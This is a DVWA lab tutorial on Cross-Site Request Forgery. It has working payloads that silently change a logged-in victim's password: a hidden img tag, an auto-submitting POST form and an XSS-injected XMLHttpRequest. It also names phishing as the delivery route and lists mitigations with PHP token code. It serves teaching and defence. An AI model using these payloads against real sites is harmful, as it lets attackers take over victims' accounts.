CSRF (Cross-Site Request Forgery)

🔍 What Is It?

Cross-Site Request Forgery (CSRF) is an attack that tricks an authenticated user into unknowingly submitting a malicious request to a web application they are currently logged into. The server cannot distinguish the forged request from a legitimate one because it comes with the victim's valid session cookies.
The attacker doesn't steal the session — they abuse it.


⚙️ How It Works in DVWA


DVWA's CSRF module has a password change form. At the Low security level, the request to change password looks like:
GET /vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
There is no CSRF token — any page that causes the victim's browser to make this GET request will successfully change their password.


💥 Exploitation

Step 1 — Craft a Malicious Page

The attacker hosts a webpage that silently triggers the password change:
html<!-- attacker.com/pwn.html -->
<html>
  <body>
    <h1>You won a prize! 🎉</h1>
    <!-- Auto-submitted form -->
    <img src="http://dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change" 
         style="display:none" />
  </body>
</html>
An <img> tag makes a GET request. The victim's browser sends their session cookie automatically.
Step 2 — Deliver the Link
The attacker sends the link to the victim via:

Phishing email
Forum post / comment
Social media message

Step 3 — Result
When the logged-in victim opens attacker.com/pwn.html:

Their browser makes the GET request to DVWA
DVWA sees a valid session cookie
DVWA changes the password to pwned
The victim is locked out of their own account

POST-Based CSRF (Medium Security)
For POST forms, use a hidden auto-submitting form:
html<html>
  <body onload="document.forms[0].submit()">
    <form action="http://dvwa/vulnerabilities/csrf/" method="POST">
      <input type="hidden" name="password_new" value="hacked" />
      <input type="hidden" name="password_conf" value="hacked" />
      <input type="hidden" name="Change" value="Change" />
    </form>
  </body>
</html>
Combining CSRF + XSS (Stored CSRF)
If the application also has Stored XSS, inject the CSRF payload directly:
html<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change', false);
  xhr.send();
</script>




🔐 Mitigation

MethodDescriptionCSRF TokensInclude a unique, unpredictable token in every state-changing request; verify server-sideSameSite CookieSet SameSite=Strict or SameSite=Lax to prevent cookies being sent cross-originReferer/Origin Header CheckValidate that requests originate from the expected domainRe-authenticationRequire the current password when changing sensitive settingsDouble Submit CookieSend token in both cookie and request; compare both server-side
php// ✅ CSRF Token implementation
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// In form:
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

// On submit:
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die("CSRF token mismatch.");
}

